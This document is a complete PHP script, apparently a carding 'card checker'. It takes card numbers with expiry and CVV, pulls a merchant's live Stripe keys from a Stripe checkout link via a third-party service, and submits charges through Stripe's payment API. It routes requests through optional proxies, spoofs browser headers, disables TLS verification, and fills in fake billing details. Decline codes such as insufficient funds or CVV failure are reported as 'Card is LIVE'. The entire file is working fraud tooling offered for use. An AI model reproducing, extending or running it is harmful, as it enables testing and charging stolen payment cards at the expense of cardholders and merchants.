<?php
// Stripe Checkout Gateway
// Processes cards against Stripe checkout links

header('Content-Type: application/json');

$checkoutUrl = $_POST['checkout_url'] ?? $_GET['checkout_url'] ?? '';
$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

if (empty($checkoutUrl) || empty($card)) {
    echo json_encode(['success' => false, 'error' => 'Missing checkout URL or card']);
    exit;
}

// Parse card details
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo json_encode(['success' => false, 'error' => 'Invalid card format. Use: number|month|year|cvv']);
    exit;
}

list($cardNumber, $month, $year, $cvv) = array_map('trim', $parts);

// Clean year
if (strlen($year) == 2) $year = '20' . $year;
$yearTwoDigit = substr($year, -2);
$month = str_pad($month, 2, '0', STR_PAD_LEFT);

// Step 1: Get checkout data via rylax.pro API
$encodedUrl = urlencode($checkoutUrl);
$apiUrl = "https://rylax.pro/bot.js/process?url={$encodedUrl}&cc=dummy";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    echo json_encode(['success' => false, 'error' => 'Failed to fetch checkout data']);
    exit;
}

$data = json_decode($response, true);

if (!$data || !isset($data['success']) || $data['success'] !== true) {
    $errorMsg = $data['error'] ?? 'Invalid checkout link';
    
    // Translate common Spanish errors
    $translations = [
        'No se pudo capturar la información del checkout' => 'Checkout expired or invalid',
        'URL inválida' => 'Invalid checkout URL',
        'Checkout expirado' => 'Checkout expired',
        'Claves no encontradas' => 'Stripe keys not found'
    ];
    
    foreach ($translations as $spanish => $english) {
        if (stripos($errorMsg, $spanish) !== false) {
            $errorMsg = $english;
            break;
        }
    }
    
    echo json_encode(['success' => false, 'error' => $errorMsg]);
    exit;
}

$checkoutData = $data['checkout_data'];
$pkLive = $checkoutData['pk_live'] ?? '';
$csLive = $checkoutData['cs_live'] ?? '';

if (empty($pkLive) || empty($csLive)) {
    echo json_encode(['success' => false, 'error' => 'Stripe keys not found']);
    exit;
}

// Extract checkout info for response
$amount = $checkoutData['amount'] ?? 0;
$currency = strtoupper($checkoutData['currency'] ?? 'USD');
$productName = $checkoutData['product_name'] ?? 'Auto Checkout';
$customerEmail = $checkoutData['customer_email'] ?? 'N/A';
$successUrl = $checkoutData['success_url'] ?? '';
$checkoutType = strtoupper($checkoutData['mode'] ?? 'PAYMENT');

// Parse domain from success URL
$siteDomain = 'UNKNOWN';
if (!empty($successUrl)) {
    $parsed = parse_url($successUrl);
    $siteDomain = $parsed['host'] ?? 'UNKNOWN';
}

$amountDisplay = $amount > 0 ? '$' . number_format($amount / 100, 2) . ' ' . $currency : '$0.00 USD';

// Step 2: Initialize Stripe checkout session
$initHeaders = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept: application/json, text/plain, */*",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: https://checkout.stripe.com",
    "Referer: https://checkout.stripe.com/"
];

$initData = http_build_query([
    'key' => $pkLive,
    'eid' => 'NA',
    'browser_locale' => 'en-US',
    'browser_timezone' => 'America/New_York',
    'redirect_type' => 'url'
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_pages/{$csLive}/init");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $initData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $initHeaders);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$initResponse = curl_exec($ch);
curl_close($ch);

$initData = json_decode($initResponse, true);

if (!$initData || !isset($initData['eid'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Checkout initialization failed',
        'checkout_info' => [
            'amount' => $amountDisplay,
            'site' => $siteDomain,
            'receipt' => $successUrl ?: 'N/A',
            'product' => $productName,
            'checkout_type' => $checkoutType,
            'email' => $customerEmail,
            'country' => 'US'
        ]
    ]);
    exit;
}

// Get customer info from init data
if (isset($initData['customer'])) {
    $customerEmail = $initData['customer']['email'] ?? $customerEmail;
    $customerName = $initData['customer']['name'] ?? 'Customer';
    $customerCountry = $initData['customer']['address']['country'] ?? 'US';
} else {
    $customerName = 'Test User';
    $customerCountry = 'US';
}

$zipCode = '10001';

// Step 3: Create payment method
$pmHeaders = $initHeaders;
$pmHeaders[] = "Referer: https://checkout.stripe.com/c/pay/{$csLive}";

$pmData = http_build_query([
    'type' => 'card',
    'card[number]' => $cardNumber,
    'card[cvc]' => $cvv,
    'card[exp_month]' => $month,
    'card[exp_year]' => $yearTwoDigit,
    'billing_details[name]' => $customerName,
    'billing_details[email]' => $customerEmail,
    'billing_details[address][country]' => $customerCountry,
    'billing_details[address][postal_code]' => $zipCode,
    'key' => $pkLive
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $pmData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $pmHeaders);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$pmResponse = curl_exec($ch);
curl_close($ch);

$pmData = json_decode($pmResponse, true);

if (!isset($pmData['id']) || !str_starts_with($pmData['id'], 'pm_')) {
    $errorMsg = $pmData['error']['message'] ?? 'Payment method creation failed';
    echo json_encode([
        'success' => false,
        'error' => $errorMsg,
        'checkout_info' => [
            'amount' => $amountDisplay,
            'site' => $siteDomain,
            'receipt' => $successUrl ?: 'N/A',
            'product' => $productName,
            'checkout_type' => $checkoutType,
            'email' => $customerEmail,
            'country' => $customerCountry
        ]
    ]);
    exit;
}

$paymentMethodId = $pmData['id'];

// Step 4: Confirm payment
$confirmData = http_build_query([
    'eid' => $initData['eid'],
    'payment_method' => $paymentMethodId,
    'expected_amount' => $initData['invoice']['amount_due'] ?? $amount,
    'expected_payment_method_type' => 'card',
    'key' => $pkLive,
    'referrer' => $initData['success_url'] ?? 'https://checkout.stripe.com'
]);

$confirmHeaders = $pmHeaders;
$confirmHeaders[] = "Idempotency-Key: " . uniqid();

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_pages/{$csLive}/confirm");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $confirmData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $confirmHeaders);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$confirmResponse = curl_exec($ch);
curl_close($ch);

$confirmData = json_decode($confirmResponse, true);

$checkoutInfo = [
    'amount' => $amountDisplay,
    'site' => $siteDomain,
    'receipt' => $successUrl ?: 'N/A',
    'product' => $productName,
    'checkout_type' => $checkoutType,
    'email' => $customerEmail,
    'country' => $customerCountry
];

if (isset($confirmData['payment_intent']['status'])) {
    $status = $confirmData['payment_intent']['status'];
    
    if ($status === 'succeeded') {
        echo json_encode([
            'success' => true,
            'status' => 'approved',
            'message' => 'Charged successfully',
            'checkout_info' => $checkoutInfo
        ]);
    } elseif ($status === 'requires_action') {
        echo json_encode([
            'success' => true,
            'status' => 'approved',
            'message' => '3D Secure required (LIVE card)',
            'checkout_info' => $checkoutInfo
        ]);
    } else {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => ucfirst(str_replace('_', ' ', $status)),
            'checkout_info' => $checkoutInfo
        ]);
    }
    exit;
}

// Check for decline codes and LIVE indicators
if (isset($confirmData['error'])) {
    $errorMsg = $confirmData['error']['message'] ?? 'Payment failed';
    $declineCode = $confirmData['error']['decline_code'] ?? '';
    
    // Check for LIVE card indicators
    $liveIndicators = ['cvv2_failure', 'invalid_security_code', 'invalid_billing_address', 'insufficient_funds'];
    foreach ($liveIndicators as $indicator) {
        if (stripos($errorMsg, $indicator) !== false || stripos($declineCode, $indicator) !== false) {
            echo json_encode([
                'success' => true,
                'status' => 'approved',
                'message' => 'Card is LIVE (' . $errorMsg . ')',
                'checkout_info' => $checkoutInfo
            ]);
            exit;
        }
    }
    
    // Check for expired card
    if (stripos($errorMsg, 'expired') !== false || stripos($declineCode, 'expired') !== false) {
        echo json_encode([
            'success' => true,
            'status' => 'declined',
            'message' => 'Card expired',
            'checkout_info' => $checkoutInfo
        ]);
        exit;
    }
    
    echo json_encode([
        'success' => true,
        'status' => 'declined',
        'message' => $errorMsg,
        'checkout_info' => $checkoutInfo
    ]);
    exit;
}

echo json_encode([
    'success' => true,
    'status' => 'declined',
    'message' => 'Payment processing failed',
    'checkout_info' => $checkoutInfo
]);
?>
